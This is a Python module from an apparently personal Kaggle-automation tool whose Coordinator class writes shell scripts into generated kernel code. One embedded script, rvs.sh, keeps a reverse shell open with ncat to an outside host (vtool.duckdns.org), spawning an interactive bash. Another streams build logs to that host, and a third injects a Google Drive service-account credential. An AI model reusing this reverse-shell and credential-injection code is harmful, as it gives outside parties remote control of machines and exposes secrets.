import json
import os
import re
import shutil
import subprocess
from string import Template

import slug

from kaggle_runner.utils import logger

rvs_str = r"""#!/bin/bash -x
export PS4='Line ${LINENO}: ' # for debug
NC=ncat

# https://stackoverflow.com/questions/57877451/retrieving-output-and-exit-code-of-a-coprocess
# coproc { sleep 30 && echo "Output" && exit 3; }
# Saving the coprocess's PID for later, as COPROC_PID apparently unsets when its finished
# COPROC_PID_backup=$COPROC_PID
#
# Retrieving the coprocess's output
# output=$(cat <&$COPROC)
#
# Retrieving the coprocess's exit code
# wait $COPROC_PID_backup
#
# Echoing out the results
# echo $?
# echo $output

echo BASH NOW: $BASHPID

PID_FILE_PATH=/tmp/nc.pid
EXIT_FILE_PATH=/tmp/rvs_exit.$BASHPID.pid

test -f $EXIT_FILE_PATH && rm $EXIT_FILE_PATH

SERVER=vtool.duckdns.org
PORT=23454
CHECK_PORT=$((PORT + 1))

check_exit_status() {
  if [ -f $EXIT_FILE_PATH ] && [ x"$(cat $EXIT_FILE_PATH)" = x0 ]; then
    return 0
  fi

  return 1 # not ok
}


connect_setup() {
  connect_again_flag=1

  while [ ${connect_again_flag} -eq 1 ]; do
    check_exit_status && return 0

    # The standard output of COMMAND is connected via a pipe to a file
    # descriptor in the executing shell, and that file descriptor is assigned
    # to 'NAME'[0].  The standard input of COMMAND is connected via a pipe to
    # a file descriptor in the executing shell, and that file descriptor is
    # assigned to 'NAME'[1].  This pipe is established before any redirections
    # specified by the command (*note Redirections::).

    # PID_FILE_PATH=$PID_FILE_PATH.$BASHPID

    # coproc connect_to_server $1
    # exec -l python setup_pty log_master log_log <&${COPROC[0]} >&${COPROC[1]} 2>&1
    # RSPID=$!

    # COPROC_PID_backup=$COPROC_PID
    # echo $COPROC_PID_backup > $PID_FILE_PATH

    # wait $RSPID # what about connection loss? need to check heatbeat
    # RSRET=$?

    # if [ x"$RSRET" = x"0" ] && [ x"$RSPID" != x ]; then  # TODO fix, named pipe, return always 120?
    #   echo $RSRET > $EXIT_FILE_PATH

    #   return $RSRET
    # fi
    # # else part below

    # sleep 15 # wait PID FILE PATH created, 15s should be fine
    # tail --pid=$(cat $PID_FILE_PATH) -f /dev/null &&
    # rm $PID_FILE_PATH

    # pkill $RSPID
    # connect_again_flag=0
    # # just recursively, sleep in case...
    # sleep 5 && [ ! $RSRET -eq 120 ] && connect_again_flag=1

    $NC -w ${1}s -i 1800s $SERVER $PORT -c "python -c 'import pty; pty.spawn(\"/bin/bash\")'"


    RSRET=$?
    echo $RSRET > $EXIT_FILE_PATH
    >&2 echo "$NC return with code $RSRET"

    if [ x"$RSRET" = x"0" ]; then
      [ -f /tmp/rvs_exit ] && return 0

      return 255 # just do not return
    fi
    connect_again_flag=0
    sleep 5 && [ ! $RSRET -eq 0 ] && connect_again_flag=1
  done
  # exit, will cause rvs script exit, beside, RSRET not 0, mean connection loss
  # thing
  echo $RSRET > $EXIT_FILE_PATH && return $RSRET
}

connect_again() {
  # pkill -f "nc.*$PORT"  # no need now, our listen server can accept multiple
  # connection now
  connect_setup $1
}

WAIT_LIMIT=2048
INIT_WAIT=8
port_connect_status=0
wait_time=$INIT_WAIT

floatToInt() {
  parsed=$(printf "%.0f" "$@")
  [ ! $? -eq 0 ] && parsed=0
  echo $parsed
} 2> /dev/null

while true; do
  check_exit_status && exit 0
  # if find that server cannot be connected, we try to restart our reverse connect again
  nc_time=$($(which time) -f "%e" $NC -zw $wait_time $SERVER $CHECK_PORT 2>&1 > /dev/null)
  nc_ret=$?
  nc_time=$(echo $nc_time | awk '{print $NF}')
  nc_time=$(floatToInt $nc_time)

  if [ ${nc_ret} -eq 0 ]; then
    # recover connection, need to connect_again too. For 1st time, will try to connect
    # no connection last time, have connction now

    if [ $port_connect_status -eq 0 ]; then
      echo "recover connection, reset wait_time and try to reconnect"
      wait_time=$INIT_WAIT
      # previous connection is lost, we wait for longer to setup connection
      check_exit_status || wait_time=15
      connect_again $wait_time &
    else
      wait_time=$((wait_time + wait_time)) # double wait, network fine

      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi
    fi
    port_connect_status=1
  else
    if [ $port_connect_status -eq 1 ]; then
      echo "found connection loss, reset wait_time and try to reconnect"
      wait_time=$INIT_WAIT
      check_exit_status || wait_time=15 # previous connection is lost
      connect_again $wait_time &
    else # no connection all the time? we still try to connect...
      wait_time=$((wait_time + wait_time))

      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi
      connect_again $wait_time &
    fi
    port_connect_status=0
  fi
  sleep $((wait_time - nc_time)) # check every XX seconds
  echo $hostname $HOSTNAME
done
wait  # wait for any background

# https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e
# In reverse shell
# $ python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z
#
# In Attacker console
# $ stty raw -echo
# $ fg
#
# In reverse shell
# $ reset
# $ export SHELL=bash
# $ export TERM=xterm-256color
# $ stty rows <num> columns <cols>
"""

rvs_pty_config_str = r"""#!/bin/bash
[ -d ~/.fzf ] || {
git clone --depth=1 https://github.com/pennz/dotfiles
rsync -r dotfiles/.* ~
pushd ~
git submodule update --init
.fzf/install --all
curl -fLo ~/.config/nvim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim
vim -u ~/.vimrc_back "+call plug#begin()" +PlugInstall +qa &
( sleep 60; nvim -Vnvim_log -u ~/.vimrc_back "+call plug#begin()" +PlugInstall +checkhealth +qa )&
ln -s .shrc_customised.macos .shrc_customised
echo "alias gdrive='gdrive  --service-account a.json'" >> ~/.bash_aliases
echo "unalias vim" >> ~/.bash_aliases
echo "alias vim='nvim -u ~/.vimrc_back'" >> ~/.bash_aliases
popd

cat >> ~/.bashrc << EOF
reset
export SHELL=bash
export TERM=screen-256color
stty intr ^\c susp ^\x eof ^\f echo opost
# https://unix.stackexchange.com/questions/343088/what-is-the-equivalent-of-stty-echo-for-zsh
unsetopt ZLE # for zsh
# for ourside stty raw isig -echo icrnl time 3 echoprt opost eof ^\p

color_my_prompt () {
    local __user_and_host="\[\033[01;32m\]\u@\h"
    local __cur_location="\[\033[01;34m\]\w"
    local __git_branch_color="\[\033[31m\]"
    # local __git_branch="\`ruby -e \"print (%x{git branch 2> /dev/null}.grep(/^\*/).first || '').gsub(/^\* (.+)$/, '(\1) ')\"\`"
    local __git_branch='`git branch 2> /dev/null | grep -e ^* | sed -E  s/^\\\\\*\ \(.+\)$/\(\\\\\1\)\ /`'
    local __prompt_tail="\[\033[35m\]$"
    local __last_color="\[\033[00m\]"
    export PS1="$__user_and_host $__cur_location $__git_branch_color$__git_branch$__prompt_tail$__last_color "
}

ENV=/root/.bashrc
PYTHONWARNINGS=ignore:::pip._internal.cli.base_command
MPLBACKEND=module://ipykernel.pylab.backend_inline

PS4="$HOSTNAME: "'${LINENO}: '
_=/usr/bin/env

color_my_prompt
echo "#" $(date) started connection
echo "#" $(grep 'cpu ' /proc/stat >/dev/null;sleep 0.1;grep 'cpu ' /proc/stat | awk -v RS="" '{print "CPU: "($13-$2+$15-$4)*100/($13-$2+$15-$4+$16-$5)"%"}') "Mem: "$(awk '/MemTotal/{t=$2}/MemAvailable/{a=$2}END{print 100-100*a/t"%"}' /proc/meminfo) "Uptime: "$(uptime | awk '{print $1 " " $2 " " $3}')
echo "#" $hostname $HOSTNAME
EOF
}
"""

gdrive_str = r"""#!/bin/bash
wget https://github.com/gdrive-org/gdrive/releases/download/2.1.0/gdrive-linux-x64
chmod +x gdrive-linux-x64
cp gdrive-linux-x64 /bin/gdrive

mkdir ~/.gdrive

# auth file
cat > ~/.gdrive/a.json << EOF
CONTENT_CREDENTIAL
EOF

gdrive --service-account a.json list  # just test

SRC_WORK_FOLDER=/kaggle/input
[ -d ${SRC_WORK_FOLDER} ] || {
    mkdir -p ${SRC_WORK_FOLDER}
    cd ${SRC_WORK_FOLDER}
    gdrive --service-account a.json download -r 1CHDWIN0M6PD4SQyplbWefBCzNzdPVd-m
    tar xf siim-train-test.tar.gz -C /kaggle/input
}
# cat > tgz_files.sh << EOF
# #!/bin/bash
# tgzfile () {
#   tar cf - $1 -P | pv -s $(du -sb $1 | awk '{print $1}') | gzip > /home/$1.tar.gz
# }
# cd /kaggle/input
# find . -maxdepth 1 -type d -name "??*" | while read -r line; do
#     echo $line
#     tgzfile $line
# done
# EOF
"""

runner_src = r"""#!/bin/bash -x
export PS4='Line ${LINENO}: '  # for debug
NC=ncat

USER=$1
shift
REPO=$1
shift
BRANCH=$1
shift
PHASE=$1
shift
ENABLE_RVS=$1
shift

SERVER=vtool.duckdns.org
PORT=23454
CHECK_PORT=$(( PORT + 1 ))
apt update && apt install -y netcat nmap screen time
apt install -y fish tig ctags htop tree pv tmux psmisc neovim &

bash rpt
wait_ncat() {
  wait_for_ncat=$1

  while [ $wait_for_ncat -gt 0 ]; do
    wait_for_ncat=$(( wait_for_ncat - 1))
    which ncat >/dev/null && return 0
  done
}
wait_ncat 60

which $NC >/dev/null || NC=nc
export NC

pip install ripdb pydicom parse pytest-logger python_logging_rabbitmq coverage &
python3 -m pip install pyvim neovim msgpack==1.0.0 &&
python -m pip install pyvim neovim msgpack==1.0.0 &&  # for vim

SRC_WORK_FOLDER=/kaggle/working
[ -d ${SRC_WORK_FOLDER} ] || mkdir -p ${SRC_WORK_FOLDER}

cd ${SRC_WORK_FOLDER}

if [ -d ${REPO} ]; then rm -rf ${REPO}; fi
{
  mvdir () {
      [[ "$2"/"$1" -ef "${PWD}" ]] || { rm -rf "$2"/"$1" &&
          mkdir "$2"/"$1"
      }

      bash -c "mv ""$1""/*"" $2""/""$1"
  }
  export -f mvdir

  git clone --single-branch --branch ${BRANCH} --depth=1 \
    https://github.com/${USER}/${REPO}.git ${REPO} && pushd ${REPO} && \
  git submodule update --init --recursive
  find . -maxdepth 1 -name ".??*" -o -name "??*" -type f | xargs -I{} mv {} $OLDPWD
  find . -maxdepth 1 -name ".??*" -o -name "??*" -type d | xargs -I{} bash -x -c "mvdir {}  $OLDPWD"
  popd
  pip install -e .
}

USE_AMQP=1
export USE_AMQP

if [ x"${PHASE}" = x"dev" ]; then
  pip install -e .
  export PS4='[Remote]: Line ${LINENO}: '

  if [ "x${ENABLE_RVS}" = x1 ]; then
    [ -z $(pgrep -f 'jupyter-notebook') ] && bash -x ./rvs.sh 2>&1 ||
    screen -d -m bash -c "{ echo [REMOTE]: rvs log below.; bash -x ./rvs.sh 2>&1; } | $NC --send-only --no-shutdown -w 120s -i $(( 3600 * 2 ))s $SERVER $CHECK_PORT";
  fi &
  make install_dep >/dev/null;
  make toxic 2>&1 | tee -a lstm_log | ( [ $USE_AMQP -eq 0 ] && $NC --send-only -w 120s -i $(( 60 * 5 ))s $SERVER $CHECK_PORT || cat - )
fi

if [ x"${PHASE}" != x"dev" ]; then
  pip install kaggle_runner
  python main.py "$@";
fi
"""


class Coordinator:
    template_path = "kaggle_runner/runner_template/"  # TODO just put it in the code
    """run in controller side, the runners run in dockers with GPUs"""

    def __init__(self, tmp_path, title_prefix):
        self.tmp_path = tmp_path
        self.runners = []
        self.title_prefix = title_prefix

    def push_all(self):
        for path in self.runners:
            self.push(path)

    @staticmethod
    def push(runner):
        "Push the code to server/kagger docker"
        logger.debug(" ".join(["kaggle", "kernels", "push", "-p", runner]))

        return subprocess.run(["kaggle", "kernels", "push", "-p", runner])

    def push_listen(self):
        self.push_all()
        self._get_result(timeout=60)

    def _get_result(self, timeout):
        """use the message queue, just use this right after push, listen for
        result, debug local first

        use jq change source code to add the log collector"
        """

    @staticmethod
    def _change_kernel_meta_info(folder, name, script, gpu=False):
        with open(os.path.join(folder, "kernel-metadata.json"), "r+") as jf:
            data = json.load(jf)

            if name is not None:
                if not script:
                    name = name + " nb"
                slug_name = slug.slug(name)
                data["id"] = re.sub(r"/.*", "/" + slug_name, data["id"])
                data["title"] = slug_name
            data["enable_gpu"] = "true" if gpu else "false"

            if not script:
                data["kernel_type"] = "notebook"
                data["code_file"] = "main.ipynb"
            else:
                data["kernel_type"] = "script"
                data["code_file"] = "main.py"
            jf.seek(0)
            json.dump(data, jf)
            jf.truncate()

    @staticmethod
    def _change_main_py(path, size, net, AMQPURL, seed, gdrive_enable=False):
        s = Template(
            """#!/usr/bin/env python3
import selectors
import subprocess
import sys

with open("runner.sh", "w") as f:
    f.write(
r\"\"\"${runner_src}\"\"\"
    )
with open("rvs.sh", "w") as f:
    f.write(
r\"\"\"${rvs_str}\"\"\"
    )
with open("rpt", "w") as f:
    f.write(
r\"\"\"${rvs_pty_config_str}\"\"\"
    )
with open("gdrive_setup", "w") as f:
    f.write(
r\"\"\"${gdrive_str}\"\"\"
    )
entry_str = r\"\"\"#!/bin/bash
PS4='Line ${LINENO}: ' bash -x runner.sh pennz kaggle_runner master dev 1 "$AMQPURL" "$size" "$seed" "$network" >>logrunner
\"\"\"
if ${gdrive_enable}:
    entry_str += r\"\"\"PS4='Line ${LINENO}: ' bash -x gdrive_setup >>loggdrive &\"\"\"

with open("entry.sh", "w") as f:
    f.write(
        entry_str
    )


p = subprocess.Popen(
'bash -x entry.sh',
#capture_output=True,
stdout=subprocess.PIPE, stderr=subprocess.PIPE,
shell=True)

sel = selectors.DefaultSelector()
sel.register(p.stdout, selectors.EVENT_READ)
sel.register(p.stderr, selectors.EVENT_READ)

while True:
   for key, _ in sel.select():
       data = key.fileobj.read1(80).decode()
       if not data:
           exit()
       if data == "":
           continue
       if key.fileobj is p.stdout:
           #logger.debug(data)
           print(data, end="")
       else:
           #logger.error(data)
           print(data, end="", file=sys.stderr)

# URL:
# https://stackoverflow.com/questions/31833897/python-read-from-subprocess-stdout-and-stderr-separately-while-pr
# eserving-order
# Title: Python read from subprocess stdout and stderr separately while preserving order - Stack Overflow
#
# Size: 110088
# Codepage: Unicode UTF-8
# SSL Cipher: 128-bit TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256
# Encoding: gzip
# Date: Mon, 04 May 2020 23:38:11 GMT
# Last modified: Mon, 04 May 2020 23:38:11 GMT
# Time since loading: 13:08
# Last visit time: Tue May  5 07:41:07 2020
#
# Link: https://stackoverflow.com/a/56918582
# Link title: short permalink to this answer

# just a test problem
# import sys
# from time import sleep
#
# for i in range(10):
#     print(f" x{i} ", file=sys.stderr, end="")
#     sleep(0.1)
#     print(f" y{i} ", end="")
#     sleep(0.1)
# %%
# #%run /opt/conda/bin/pytest --pdb -s -k "test_pytorch"
    """
        )

        try:
            gdpass = subprocess.check_output(
                "pass gd", shell=True).decode("utf-8")
        except subprocess.CalledProcessError:
            gdpass = ""
        d = dict(
            gdrive_str=gdrive_str.replace(
                "CONTENT_CREDENTIAL", "" if os.getenv(
                    "CI") == "true" else gdpass
            ),
            rvs_pty_config_str=rvs_pty_config_str,
            rvs_str=rvs_str,
            runner_src=runner_src,
            AMQPURL=AMQPURL.string(),
            size=size,
            network=net,
            seed=seed,
            gdrive_enable=gdrive_enable,
        )
        ss = s.safe_substitute(d)
        print(ss)

        with open(os.path.join(path, "main.py"), "w") as jf:
            jf.write(ss)

    def run_local(self, path):
        return subprocess.run("python " + os.path.join(path, "main.py"), shell=True)

    def create_runner(self, config, seed="2020", script=True, from_template=True):
        """
        config will be size and model right now
        """
        size = config["size"]
        net = config["network"]
        name = net.replace("_", "-") + "-" + str(size)
        AMQPURL = config["AMQPURL"]

        path = os.path.join(self.tmp_path, name)
        shutil.copytree(self.template_path, path)

        if from_template:
            self._change_kernel_meta_info(path, None, script)
            self._change_main_py(path, size, net, AMQPURL, seed)
        else:
            self._change_kernel_meta_info(
                path, self.title_prefix + " " + name, script)
            self._change_main_py(path, size, net, AMQPURL, seed)

        if not script:
            subprocess.run(
                ("jupytext --to notebook " + os.path.join(path, "main.py")).split()
            )

        self.runners.append(path)

        return path
